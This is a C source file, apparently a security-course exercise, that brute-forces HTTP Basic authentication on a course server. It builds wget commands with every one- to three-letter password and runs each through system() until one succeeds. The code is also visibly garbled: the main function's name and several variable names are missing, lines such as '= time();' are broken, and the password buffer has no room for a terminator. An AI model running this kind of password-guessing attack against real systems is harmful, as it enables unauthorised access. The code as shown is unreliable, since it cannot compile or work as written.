

#include<stdio.h>
#include<strings.h>
#include<stdlib.h>
#include<ctype.h>
#define MAX_SIZE 255



int genchkpwd(char *chararray,char *passwd)
 {
   int i,j,k,success;
   char str1[MAX_SIZE],str2[MAX_SIZE],tempstr[MAX_SIZE];
   
   
   strcpy(str1,"wget --http-user= --http-passwd=");
   strcpy(str2," http://sec-crack.cs.rmit.edu./SEC/2/");
   strcpy(tempstr,"");



   for(i=0;i<52;i++)
    {
      passwd[0]= chararray[i];
      strcat(tempstr,str1);
      strcat(tempstr,passwd);
      strcat(tempstr,str2);
      printf("SENDING REQUEST AS %s\n",tempstr);
      success=system (tempstr);
      if (success==0)
       return 1;
      else
       strcpy(tempstr,""); 
       strcpy(passwd,"");
     }     



   for(i=0;i<52;i++)
    {
      passwd[0]= chararray[i];
      for(j=0;j<52;j++)
       {
         passwd[1]=chararray[j];
	 strcat(tempstr,str1);
         strcat(tempstr,passwd);
         strcat(tempstr,str2);
         printf("SENDING REQUEST AS %s\n",tempstr);
         success=system (tempstr);
         if (success==0)
           return 1;
         else
         strcpy(tempstr,""); 
         
      }     
    }



   for(i=0;i<52;i++)
    {
      passwd[0]= chararray[i];
      for(j=0;j<52;j++)
       {
         passwd[1]=chararray[j];
         for(k=0;k<52;k++)
	  {
	    passwd[2]=chararray[k];
	    strcat(tempstr,str1);
            strcat(tempstr,passwd);
            strcat(tempstr,str2);
            printf("SENDING REQUEST AS %s\n",tempstr);
            success=system (tempstr);
            if (success==0)
              return 1;
            else
              strcpy(tempstr,""); 
	  }    
       }     
     }
   return 1;
  }  

int  (int argc, char *argv[])
 {
     char chararray[52],passwd[3];
     int i,success;
     char ch='a';


     
     int , end;    
      = time();	 

     for (i=0;i<3;i++)
      {
          passwd[i]='\0';
      }  



     for (i=0;i<26;i++)
      {
          chararray[i]= ch;
	  ch++;
      }
      ch='A';  
     for (i=26;i<52;i++)
      {
          chararray[i]= ch;
	  ch++;
      }



      success=genchkpwd(chararray,passwd);
      printf("\nPassword is %s\n",passwd); 
      getpid();
      end = time(); 
      printf("Time required = %lld msec\n",(end-)/());
     return (EXIT_SUCCESS);
  }
     
	   
	  	
